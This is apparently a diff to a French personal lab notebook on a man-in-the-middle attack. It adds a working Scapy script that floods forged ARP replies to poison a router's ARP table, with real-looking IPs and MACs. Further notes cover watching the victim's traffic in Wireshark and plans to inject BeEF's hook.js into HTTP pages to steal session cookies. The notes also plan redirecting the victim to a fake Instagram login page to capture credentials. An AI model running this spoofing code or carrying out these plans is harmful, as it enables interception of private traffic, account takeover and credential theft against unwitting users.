@@ -633,8 +633,8 @@ packet.plen = 4
 packet.op = 2
 packet.psrc = 'xxx ip' #addr ip du routeur
 packet.pdst = 'xxx ip' #addr ip victime
-packet.hwsrc = 'xxx mac' #addr mac #addr mac de l'attaquant
-packet.hwdst = 'xxx mac' #addr mac #addr mac de la victime
+packet.hwsrc = 'xxx mac' #addr mac de l'attaquant
+packet.hwdst = 'xxx mac' #addr mac de la victime
 
 total = trame / packet
 while True: #envoyer le packet
@@ -649,6 +649,26 @@ ping 192.168.1.254 // à partir de la machine victime ==>  ca s'affiche bien sur
 Résultat : ca a marché, on a bien changé la table ARP, désormais l'adresse mac de la machine attaquante est associée à l'adresse IP du routeur. 
 ==> Maintenant il faudrait faire la même chose pour les paquets qui vont du routeur à la cible. Cad réussir à mettre notre adresse MAC à la place de l'adresse MAC de la victime dans la table ARP du routeur.
 
+````
+from scapy.all import *
+
+trame = Ether(type=0x0806) # créer une trame ethernet, valeur type permet de dire quel protocole on utilise, le ARP = 0x0806
+packet = ARP() # retourne un paquet arp vide, dans elquel on va remplire les infos
+
+packet.hwlen = 6
+packet.plen = 4
+packet.op = 2
+packet.psrc = '192.168.1.161' #addr ip de la victime
+packet.pdst = '192.168.1.254' #addr ip du routeur
+packet.hwsrc = '08:00:27:78:31:2a' #addr mac #addr mac de l'attaquant
+packet.hwdst = 'e4:9e:12:1a:4a:28' #addr mac #addr mac du routeur
+
+total = trame / packet
+while True: #envoyer le packet
+       sendp(total) 
+````
+
+
 ### b. Router les paquets reçus de la machine cible vers le routeur et inversement
 
 Par défaut, si une machine linux reçoit des paquets qui ne lui sont pas destinés (avec une IP différente), elle jete les paquets = IP forwarding est désactivé par défaut.
@@ -659,14 +679,20 @@ sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
 
 ## 2. Voir le traffic, quels sites HTTP & HTTPS il consulte
 
+--> démarré le script python
+--> check que c'est en place, arp -a, et voir si on a bien l'addr MAC de l'attaquant associé à l'IP du routeur
+dans Wireshark, filtre : ip.addr == 192.168.1.161
+clic droit>Follox>TCP stram ==> tout est chiffré 
+
+ ip.addr == 192.168.1.161 && http
 
 
 
 ## 3. Réussir à le rediriger vers le site que je veux
 
-On pourraît ajouter hook.js dans toutes les pages http demandées. Mais ce qui serait encore mieux, serait de réussir à le rediriger vers un autre site que celui demandé. 
-- par exemple il demande instagram.com ==> je le redirige vers une fausse page instagram que je crée, et récupérer ses id/mdp
-- par exemple dès que je remarque qu'il joue à lol ==> je le redirige vers une page que j'ai crée avec beef xss dedans et je bloque la fenetre avec une pop-up avec écrit "Arrête de jouer à LoL"
+On pourraît ajouter hook.js dans toutes les pages http demandées. Et alors en récuperant le cookie avec get cookie, on pourraît se connecter avec le compte de la victime sur tous les sites http. Mais ce qui serait encore mieux, serait de réussir à rediriger la victime vers un autre site que celui demandé. 
+- par exemple il demande instagram.com ==> je le redirige vers une fausse page instagram que je crée, et là, je récupère ses id/mdp
+- dès que je remarque qu'il joue à lol ==> je le redirige vers une page que j'ai crée avec beef xss dedans et je bloque la fenetre avec une pop-up avec écrit "Arrête de jouer à LoL"
 
 
 
